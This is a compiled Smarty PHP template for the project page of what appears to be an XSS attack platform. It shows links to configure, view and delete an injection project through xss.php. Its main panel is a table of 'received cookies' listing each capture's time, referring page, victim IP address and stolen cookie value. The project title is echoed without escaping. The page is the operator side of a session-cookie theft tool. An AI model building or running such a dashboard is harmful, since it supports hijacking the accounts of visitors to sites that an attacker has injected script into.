<?php /* Smarty version 2.6.26, created on 2026-02-11 17:05:39
         compiled from project_view.html */ ?>
<?php require_once(SMARTY_CORE_DIR . 'core.load_plugins.php');
smarty_core_load_plugins(array('plugins' => array(array('modifier', 'escape', 'project_view.html', 9, false),array('modifier', 'default', 'project_view.html', 9, false),array('modifier', 'date_format', 'project_view.html', 11, false),array('modifier', 'truncate', 'project_view.html', 36, false),)), $this); ?>
<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "header.html", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
<div class="page-layout">
<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "menus.html", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>
<div class="main-content">
	
	<style>
	/* ===== 主內容區 ===== */
	.main-content {
		justify-self: stretch;
		align-self: start;
		min-width: 0;
	}

	.info-row { padding: 12px 0; border-bottom: 1px solid rgba(0,212,255,0.1); }
	.info-row:last-child { border-bottom: none; }
	.info-row strong { color: var(--neon-blue); text-transform: uppercase; letter-spacing: 1px; margin-right: 10px; font-size: 12px; }
	.info-row a { color: var(--neon-blue); transition: color 0.2s ease, text-shadow 0.2s ease; }
	.info-row a:hover { color: var(--neon-green); }
	.btn-sm { padding: 8px 16px; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; border-radius: 6px; margin-right: 8px; }
	.btn-primary { background: transparent; border: 1px solid var(--neon-blue); color: var(--neon-blue); transition: background 0.2s ease, box-shadow 0.2s ease; }
	.btn-primary:hover { background: rgba(0,212,255,0.1); box-shadow: 0 0 15px rgba(0,212,255,0.3); }
	.btn-info { background: transparent; border: 1px solid var(--neon-purple); color: var(--neon-purple); transition: background 0.2s ease, box-shadow 0.2s ease; }
	.btn-info:hover { background: rgba(168,85,247,0.1); box-shadow: 0 0 15px rgba(168,85,247,0.3); }
	.btn-danger { background: transparent; border: 1px solid var(--neon-red); color: var(--neon-red); transition: background 0.2s ease, box-shadow 0.2s ease; }
	.btn-danger:hover { background: rgba(255,71,87,0.1); box-shadow: 0 0 15px rgba(255,71,87,0.3); }

	/* ===== Cookie 表格 - 跟我的專案一樣 ===== */
	.cookie-panel {
		background: var(--bg-card);
		border: 1px solid var(--border-color);
		border-radius: 12px;
		overflow: hidden;
		margin-top: 15px;
	}
	.cookie-panel:hover {
		box-shadow: 0 6px 30px rgba(0,212,255,0.15), 0 0 2px rgba(0,212,255,0.2) inset;
		border-color: rgba(0,212,255,0.3);
	}
	.cookie-panel .panel-heading {
		background: linear-gradient(135deg, rgba(0,212,255,0.15) 0%, rgba(0,0,0,0.3) 100%) !important;
		border-bottom: 1px solid var(--border-color);
		padding: 18px 25px;
		color: var(--neon-blue);
		font-weight: bold;
		text-transform: uppercase;
		letter-spacing: 1px;
	}
	.cookie-panel .panel-body { padding: 0; }
	.cookie-panel .table { width: 100%; border-collapse: collapse; margin-bottom: 0; background: rgba(20,20,30,0.9); }
	.cookie-panel .table th {
		background: rgba(168,85,247,0.15);
		color: var(--neon-purple);
		text-transform: uppercase;
		font-size: 12px;
		letter-spacing: 1px;
		padding: 20px 25px;
		border-bottom: 1px solid rgba(0,212,255,0.2);
		font-weight: 600;
	}
	.cookie-panel .table td {
		padding: 20px 25px;
		border-bottom: 1px solid rgba(0,212,255,0.1);
		color: var(--text-primary);
		vertical-align: middle;
		background: rgba(20,20,30,0.5);
	}
	.cookie-panel .table tr { transition: background 0.2s ease; }
	.cookie-panel .table tr:hover { background: rgba(0,212,255,0.08); }
	.cookie-panel .cookie-text {
		background: rgba(0,0,0,0.4);
		border: 1px solid rgba(0,212,255,0.1);
		padding: 8px 16px;
		border-radius: 6px;
		font-family: Consolas, monospace;
		font-size: 12px;
		color: var(--neon-green);
	}
	.cookie-panel .pagination { margin: 20px 0 0 0; padding: 0 20px 20px; }
	.cookie-panel .pagination a, .pagination span { display: inline-block; background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); color: var(--text-secondary); padding: 8px 14px; margin: 0 4px; border-radius: 6px; text-decoration: none; transition: background 0.2s ease, border-color 0.2s ease, color 0.2s ease; }
	.cookie-panel .pagination a:hover { border-color: var(--neon-blue); color: var(--neon-blue); background: rgba(0,212,255,0.1); }
	.cookie-panel .pagination .current { background: rgba(0,212,255,0.2); border-color: var(--neon-blue); color: var(--neon-blue); box-shadow: 0 0 10px rgba(0,212,255,0.2); }
	</style>
	
	<div class="panel">
		<div class="panel-heading">&#9889; 項目: <?php echo $this->_tpl_vars['project']['title']; ?>
</div>
		<div class="panel-body">
			<div class="info-row"><strong>描述:</strong> <?php echo ((is_array($_tmp=((is_array($_tmp=$this->_tpl_vars['project']['description'])) ? $this->_run_mod_handler('escape', true, $_tmp, 'html') : smarty_modifier_escape($_tmp, 'html')))) ? $this->_run_mod_handler('default', true, $_tmp, '...') : smarty_modifier_default($_tmp, '...')); ?>
</div>
			<div class="info-row"><strong>URL:</strong> <a href="<?php echo $this->_tpl_vars['url']['root']; ?>
/<?php echo $this->_tpl_vars['project']['urlKey']; ?>
" target="_blank"><?php echo $this->_tpl_vars['url']['root']; ?>
/<?php echo $this->_tpl_vars['project']['urlKey']; ?>
</a></div>
			<div class="info-row"><strong>創建:</strong> <?php echo ((is_array($_tmp=$this->_tpl_vars['project']['addTime'])) ? $this->_run_mod_handler('date_format', true, $_tmp, '%Y-%m-%d %H:%M') : smarty_modifier_date_format($_tmp, '%Y-%m-%d %H:%M')); ?>
</div>
			<div style="margin-top: 15px;">
				<a href="<?php echo $this->_tpl_vars['url']['root']; ?>
/xss.php?do=project&act=setcode&ty=create&id=<?php echo $this->_tpl_vars['project']['id']; ?>
" class="btn btn-primary btn-sm">配置</a>
				<a href="<?php echo $this->_tpl_vars['url']['root']; ?>
/xss.php?do=project&act=viewcode&id=<?php echo $this->_tpl_vars['project']['id']; ?>
" class="btn btn-info btn-sm">代碼</a>
				<a href="<?php echo $this->_tpl_vars['url']['root']; ?>
/xss.php?do=project&act=delete&id=<?php echo $this->_tpl_vars['project']['id']; ?>
&token=<?php echo $this->_tpl_vars['show']['user']['token']; ?>
" class="btn btn-danger btn-sm" onclick="return confirm('確定刪除嗎?')">刪除</a>
			</div>
		</div>
	</div>

	<div class="cookie-panel">
		<div class="panel-heading">&#127836; 收到的 Cookie (<?php echo ((is_array($_tmp=@$this->_tpl_vars['totalContents'])) ? $this->_run_mod_handler('default', true, $_tmp, 0) : smarty_modifier_default($_tmp, 0)); ?>
)</div>
		<div class="panel-body">
			<table class="table">
				<thead>
					<tr>
						<th width="120">時間</th>
						<th width="150">來源</th>
						<th width="110">IP</th>
						<th>Cookie 數據</th>
					</tr>
				</thead>
				<tbody>
					<?php $_from = $this->_tpl_vars['contents']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['v']):
?>
					<tr>
						<td><?php echo ((is_array($_tmp=$this->_tpl_vars['v']['addTime'])) ? $this->_run_mod_handler('date_format', true, $_tmp, '%m-%d %H:%M:%S') : smarty_modifier_date_format($_tmp, '%m-%d %H:%M:%S')); ?>
</td>
						<td><?php echo ((is_array($_tmp=((is_array($_tmp=((is_array($_tmp=@$this->_tpl_vars['v']['referer'])) ? $this->_run_mod_handler('default', true, $_tmp, '直接訪問') : smarty_modifier_default($_tmp, '直接訪問')))) ? $this->_run_mod_handler('escape', true, $_tmp, 'html') : smarty_modifier_escape($_tmp, 'html')))) ? $this->_run_mod_handler('truncate', true, $_tmp, 20) : smarty_modifier_truncate($_tmp, 20)); ?>
</td>
						<td><?php echo ((is_array($_tmp=$this->_tpl_vars['v']['ip'])) ? $this->_run_mod_handler('escape', true, $_tmp, 'html') : smarty_modifier_escape($_tmp, 'html')); ?>
</td>
						<td><span class="cookie-text"><?php echo ((is_array($_tmp=((is_array($_tmp=$this->_tpl_vars['v']['cookie'])) ? $this->_run_mod_handler('escape', true, $_tmp, 'html') : smarty_modifier_escape($_tmp, 'html')))) ? $this->_run_mod_handler('truncate', true, $_tmp, 60) : smarty_modifier_truncate($_tmp, 60)); ?>
</span></td>
					</tr>
					<?php endforeach; else: ?>
					<tr><td colspan="4" style="text-align:center;padding:40px;color:var(--text-muted);">暫無數據</td></tr>
					<?php endif; unset($_from); ?>
				</tbody>
			</table>
			<div class="pagination">
				<?php echo $this->_tpl_vars['pagers']; ?>

			</div>
		</div>
	</div>
</div>
</div>
<!-- /.page-layout -->
<?php $_smarty_tpl_vars = $this->_tpl_vars;
$this->_smarty_include(array('smarty_include_tpl_file' => "footer.html", 'smarty_include_vars' => array()));
$this->_tpl_vars = $_smarty_tpl_vars;
unset($_smarty_tpl_vars);
 ?>